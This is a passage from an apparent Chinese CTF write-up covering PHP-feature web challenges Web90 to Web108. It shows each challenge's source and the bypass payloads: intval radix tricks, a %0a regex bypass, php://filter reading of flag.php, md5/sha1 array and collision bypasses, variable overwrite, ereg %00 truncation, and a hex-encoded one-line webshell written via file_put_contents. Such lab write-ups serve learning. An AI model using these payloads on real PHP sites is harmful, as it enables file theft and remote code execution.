class="headerlink" title="Web90"></a>Web90</h3><p>这道题目是intval( )函数的使用，还是看下这个函数的官方文档吧：</p><blockquote><p>intval ( mixed $var [, int $base = 10 ] ) : int<br>#Note: 如果 base 是 0，通过检测 var 的格式来决定使用的进制：<br>#如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，<br>#如果字符串以 “0” 开始，使用 8 进制(octal)；否则，<br>#将使用 10 进制 (decimal)。</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">===</span><span class="token string double-quoted-string">"4476"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以使用的方式很多，<strong>4476.0</strong>，**+4476.0<strong>，</strong>4476e0<strong>，</strong>0x117c<strong>，</strong>010574**这些方式都可以绕过===</p><h3 id="Web91"><a href="#Web91" class="headerlink" title="Web91"></a>Web91</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^php$/im'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^php$/i'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'nonononono'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>正则表达式， <code>i</code> 不区分大小写 <code>m</code> 多行匹配</li><li>多行匹配中存在php,单行不匹配</li><li><code>?cmd=%0aphp</code> </li></ul><h3 id="Web92"><a href="#Web92" class="headerlink" title="Web92"></a>Web92</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个什么都没有过滤，可以用+法，小数，八进制，十六进制都行…….</p><h3 id="Web93"><a href="#Web93" class="headerlink" title="Web93"></a>Web93</h3><p>这道题过滤了 [a-z]/i ，并且将$num===”4476”转化为$num==”4476”，这样使用+4476,4476.0都被过滤了，同时过滤了字母，所以包含0x的十六进制也被过滤了，我们可以使用八进制形式的<strong>010574</strong>进行绕过</p><h3 id="Web94"><a href="#Web94" class="headerlink" title="Web94"></a>Web94</h3><p>这道题又改回了 $num===”4476” ，这样把小数给放出来了，这样应该是考我们小数.?num=4476.0就能完成。当然用计算的方式也行，比如4476+0</p><h3 id="Web95"><a href="#Web95" class="headerlink" title="Web95"></a>Web95</h3><p>这一个题目的问题主要产生在 strpos ()这个函数上，可以看到这个函数必须含有0，同时弱类型匹配过滤了运算，下面又进一步过滤了小数点，16进制，还是使用八进制的<strong>010574</strong>进行操作，对strpos函数的绕过，我们可以使用<code> 空格</code>或者换行符</p><center><img src="https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201011152911526-1511795862.png" style="zoom:50%;" /></center>### Web96<p>在linux下面表示当前目录是 ./ 所以payload： u=./flag.php，这一道题应该说是linux系统尝试和PHP特性的结合吧</p><p>这里也可以使用php伪协议进行绕过:?file=php://filter/convert.base64-encode/resource=flag.php对得到的内容进行PHP解码就行</p><h3 id="Web97"><a href="#Web97" class="headerlink" title="Web97"></a>Web97</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token keyword">print</span> <span class="token string single-quoted-string">'Wrong.'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>a!=b，同时md5值相同这直接上数组就行…….<code>a[]=1&amp;b[]=2</code></p><h3 id="Web98"><a href="#Web98" class="headerlink" title="Web98"></a>Web98</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_COOKIE</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_SERVER</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_FLAG'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$flag</span><span class="token punctuation">:</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里是三目运算符和取地址， 根据第一条可知，如果get传了一个值，那么就可以用post覆盖get中的值。中间两行意义不大 ， 如果get传了一个HTTP_FLAG=flag就输出flag否则显示index.php源码。<br>思路：存在get参数，那么POST参数赋值给GET（名为GET其实为POST）在POST参数HTTP_FLAG</p><blockquote><p>?a=a post:HTTP_FLAG=flag</p></blockquote><h3 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v4</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>v2,v3以get传参传入，v1必须通过post传参传入。</p><p> <strong>is_numeric()</strong> 函数用于检测变量是否为数字或数字字符串，如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE，注意浮点型返回 1，即 TRUE。但在php5版本下有漏洞，在数字中间带e会被识别为科学计数法。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">$a='&lt;?=`cat *`;';$b=base64_encode($a);  // PD89YGNhdCAqYDs=$c=bin2hex($b);      //这里直接用去掉=的base64//输出5044383959474e6864434171594473<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>file_put_contents()</strong> 函数把一个字符串写入文件中。 </p><p><strong>call_user_func()</strong> 函数把第一个参数作为回调函数调用，通过这个函数可以将编码为16进制的V2重新变为一句话木马，v3通过伪协议写入1.php文件中内容，v1通过Post传参传入<strong>hex2bin</strong></p><h3 id="Web103"><a href="#Web103" class="headerlink" title="Web103"></a>Web103</h3><p>解题过程payload同web102</p><h3 id="Web104"><a href="#Web104" class="headerlink" title="Web104"></a>Web104</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要求v1的散列与v2的散列相等， sha1()函数在判断时无法处理数组类型，会返回false，故可以构建数组类型绕过 </p><p>当然因为没有什么过滤什么的，完全可以直接令v1和v2都置为1，也能得到flag。</p><h3 id="Web105"><a href="#Web105" class="headerlink" title="Web105"></a>Web105</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$error</span><span class="token operator">=</span><span class="token string single-quoted-string">'你还想要flag嘛？'</span><span class="token punctuation">;</span><span class="token variable">$suces</span><span class="token operator">=</span><span class="token string single-quoted-string">'既然你想要那给你吧！'</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">#get是一个预定义的数组，此处将get中的数据按照键值对取出</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token operator">===</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">#key是传入的参数名称 成立条件  error=random</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span><span class="token comment">#此处将传入的传参名（键）和传参值（值）定义为变量，并使传参名（键）的数值等于传参值（值），通俗的说，就是咱们人工加入了一个变量，而且给予赋值</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">#post同样是一个预定义的数组，同样按照键值对取出</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token operator">===</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">#如果传入的值为flag，if判定成立</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span><span class="token comment">#同上，人工添加变量</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"your are good"</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token comment">#要输出flag需要满足$_POST['flag']==$flag，但是$flag属于未知，我们就可以进行变量覆盖</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$suces</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Web106"><a href="#Web106" class="headerlink" title="Web106"></a>Web106</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$v1</span><span class="token operator">!=</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们这里需要使用数组绕过也可以使用，强碰撞 aaroZmOk与aaK1STfY或aaO8zKZF与aa3OFF9m </p><h3 id="Web107"><a href="#Web107" class="headerlink" title="Web107"></a>Web107</h3><p>这个真是涨知识了，parse_str()函数这个我真不知道。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在官方文档中</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">parse_str — 将字符串解析成多个变量<span class="token function">parse_str</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$encoded_string</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token keyword type-declaration">array</span> <span class="token operator">&amp;</span><span class="token variable">$result</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">void</span>如果设置了第二个变量 result， 变量将会以数组元素的形式存入到这个数组，作为替代。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> 我们传入v3=1 然后v1=flag=c4ca4238a0b923820dcc509a6f75849b 即1的md5值即可 </p><h3 id="Web108"><a href="#Web108" class="headerlink" title="Web108"></a>Web108</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ereg</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"^[a-zA-Z]+$"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>考察点：ereg %00正则截断 </p><p>第一层是ereg()函数， ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。 </p><p>第二层一个弱比较，strrev()函数是反转字符串，intval()函数通过使用指定的进制 base 转换，返回变量 var 的 integer 数值。</p><p>我们可以通过a%00778完成绕过。首先正则表达式只会匹配%00之前的内容，后面的被截断掉，可以通过正则表达式检测，后面通过反转成877%00a，再用intval函数获取整数部分得到877，877为0x36d的10进制。</p><h3 id="Web109"><a href="#Web109" class="headerlink" 